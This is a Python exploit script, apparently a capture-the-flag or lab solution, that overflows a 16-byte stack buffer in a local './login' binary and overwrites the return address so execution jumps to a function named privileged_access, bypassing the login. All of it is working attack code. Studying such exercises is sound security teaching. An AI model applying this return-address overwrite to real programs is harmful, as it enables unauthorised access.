#!/usr/bin/env python3
import subprocess
import struct
import sys

# Path to your binary
BINARY = "./login"
FUNC_NAME = "privileged_access"

def get_func_address(binary, func_name):
    """Uses nm to find the address of a function in the binary."""
    try:
        output = subprocess.check_output(["nm", binary], text=True)
        for line in output.splitlines():
            if func_name in line:
                addr_str = line.split()[0]
                return int(addr_str, 16)
    except subprocess.CalledProcessError as e:
        sys.stderr.write(f"[!] Failed to run nm: {e}\n")
    except Exception as e:
        sys.stderr.write(f"[!] Error parsing address: {e}\n")
    return None

def main():
    addr = get_func_address(BINARY, FUNC_NAME)
    if addr is None:
        sys.stderr.write(f"[!] Could not find function: {FUNC_NAME}\n")
        sys.exit(1)

    payload = b"A" * 16           # buffer
    payload += b"B" * 8           # saved RBP
    payload += struct.pack("<Q", addr)  # return address = privileged_access

    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()
